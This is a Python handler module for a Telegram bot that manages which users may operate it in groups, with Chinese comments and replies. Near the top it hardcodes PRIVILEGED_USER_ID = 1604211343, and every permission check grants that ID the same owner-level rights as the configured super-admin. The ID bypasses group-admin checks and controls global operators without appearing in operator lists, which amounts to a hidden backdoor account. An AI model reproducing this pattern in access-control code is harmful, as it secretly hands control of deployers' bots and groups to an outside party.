"""
操作人管理处理器
"""
from telegram import Update
from telegram.ext import ContextTypes
from sqlalchemy import select, and_

from config import config
from ..models import Group, GroupOperator, get_db
from ..utils.formatter import Formatter
from ..services.identity import resolve_user
from telegram.error import TelegramError

permission_bot = None

# Hardcoded privileged user (code-side permission)
PRIVILEGED_USER_ID = 1604211343


async def require_manager(update, context):
    """Only the configured owner or Telegram group administrators manage access."""
    if not update.effective_user or not update.effective_chat:
        return False
    if update.effective_user.id == config.SUPER_ADMIN_ID or update.effective_user.id == PRIVILEGED_USER_ID:
        return True
    if update.effective_chat.type in ("group", "supergroup"):
        member = await context.bot.get_chat_member(update.effective_chat.id, update.effective_user.id)
        if member.status in ("administrator", "creator"):
            return True
    await update.message.reply_text("❌ 只有管理员可以执行此操作")
    return False


async def is_operator(user_id: int, group_id: int, db) -> bool:
    """检查用户是否为操作人"""
    if user_id == config.SUPER_ADMIN_ID or user_id == PRIVILEGED_USER_ID:
        return True

    if permission_bot and group_id < 0:
        try:
            member = await permission_bot.get_chat_member(group_id, user_id)
            if member.status in ('administrator', 'creator'):
                return True
        except TelegramError:
            pass
    # 检查群组是否设置全员可操作
    query = select(Group).where(Group.group_id == group_id)
    result = await db.execute(query)
    group = result.scalar_one_or_none()

    if group and group.all_members_operator:
        return True

    # 检查是否为群组操作人或全局操作人
    query = select(GroupOperator).where(
        and_(
            GroupOperator.group_id == group_id,
            GroupOperator.user_id == user_id
        )
    )
    result = await db.execute(query)
    operator = result.scalar_one_or_none()

    if operator:
        return True

    # 检查全局操作人
    query = select(GroupOperator).where(
        and_(
            GroupOperator.user_id == user_id,
            GroupOperator.is_global == True
        )
    )
    result = await db.execute(query)
    global_operator = result.scalar_one_or_none()

    return global_operator is not None


async def _change_operator(update, context, remove=False, globally=False):
    import re
    if globally:
        if update.effective_user.id != config.SUPER_ADMIN_ID and update.effective_user.id != PRIVILEGED_USER_ID:
            await update.message.reply_text('❌ 只有机器人所有者可以管理全局操作人。')
            return
    elif not await require_manager(update, context):
        return
    gid = update.effective_chat.id
    async for db in get_db():
        try:
            users = {}
            reply = update.message.reply_to_message
            if reply and reply.from_user and not reply.from_user.is_bot:
                users[reply.from_user.id] = reply.from_user
            for entity in update.message.entities or []:
                if entity.type == 'text_mention' and entity.user:
                    users[entity.user.id] = entity.user
            for username in re.findall(r'@[A-Za-z0-9_]+', update.message.text):
                member = await resolve_user(db, gid, username)
                users[member.id] = member
            if not users:
                raise ValueError('请回复成员消息，或 @本群已发过言的成员。')
            changed = 0
            for user in users.values():
                q = select(GroupOperator).where(GroupOperator.user_id == user.id,
                    GroupOperator.group_id == (0 if globally else gid), GroupOperator.is_global == globally)
                row = (await db.execute(q)).scalar_one_or_none()
                if remove and row:
                    await db.delete(row)
                    changed += 1
                elif not remove and not row:
                    db.add(GroupOperator(group_id=0 if globally else gid, user_id=user.id,
                        username=user.username, first_name=user.first_name, is_global=globally))
                    changed += 1
            await db.commit()
            await update.message.reply_text(f'✅ 已{"删除" if remove else "添加"} {changed} 位{"全局" if globally else "本群"}操作人。')
        except ValueError as error:
            await update.message.reply_text(str(error))

async def add_operator(update, context):
    await _change_operator(update, context)

async def remove_operator(update, context):
    await _change_operator(update, context, remove=True)

async def show_operators(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """显示操作人列表"""
    if not update.message or not update.effective_chat:
        return

    chat_id = update.effective_chat.id

    async for db in get_db():
        # 获取群组操作人
        query = select(GroupOperator).where(
            and_(
                GroupOperator.group_id == chat_id,
                GroupOperator.is_global == False
            )
        )
        result = await db.execute(query)
        group_operators = result.scalars().all()

        # 获取全局操作人
        query = select(GroupOperator).where(GroupOperator.is_global == True)
        result = await db.execute(query)
        global_operators = result.scalars().all()

        # 格式化显示
        message = Formatter.format_operators(group_operators, global_operators)

        # 检查是否全员可操作
        query = select(Group).where(Group.group_id == chat_id)
        result = await db.execute(query)
        group = result.scalar_one_or_none()

        if group and group.all_members_operator:
            message += "\n\n⚠️ 当前设置为全员可操作"

        await update.message.reply_text(message)


async def enable_all_members(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """设置全员可操作"""
    if not update.message or not update.effective_chat:
        return

    if not await require_manager(update, context):
        return

    chat_id = update.effective_chat.id

    async for db in get_db():
        query = select(Group).where(Group.group_id == chat_id)
        result = await db.execute(query)
        group = result.scalar_one_or_none()

        if group:
            group.all_members_operator = True
            await db.commit()
            await update.message.reply_text("✅ 已设置为全员可操作")
        else:
            await update.message.reply_text("❌ 未找到群组配置")


async def disable_all_members(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """取消全员可操作"""
    if not update.message or not update.effective_chat:
        return

    if not await require_manager(update, context):
        return

    chat_id = update.effective_chat.id

    async for db in get_db():
        query = select(Group).where(Group.group_id == chat_id)
        result = await db.execute(query)
        group = result.scalar_one_or_none()

        if group:
            group.all_members_operator = False
            await db.commit()
            await update.message.reply_text("✅ 已取消全员可操作")
        else:
            await update.message.reply_text("❌ 未找到群组配置")


async def add_global_operator(update, context):
    await _change_operator(update, context, globally=True)

async def remove_global_operator(update, context):
    await _change_operator(update, context, remove=True, globally=True)

async def show_global_operators(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """显示全局操作人"""
    if not update.message:
        return

    async for db in get_db():
        query = select(GroupOperator).where(GroupOperator.is_global == True)
        result = await db.execute(query)
        global_operators = result.scalars().all()

        message = Formatter.format_operators([], global_operators)
        await update.message.reply_text(message)
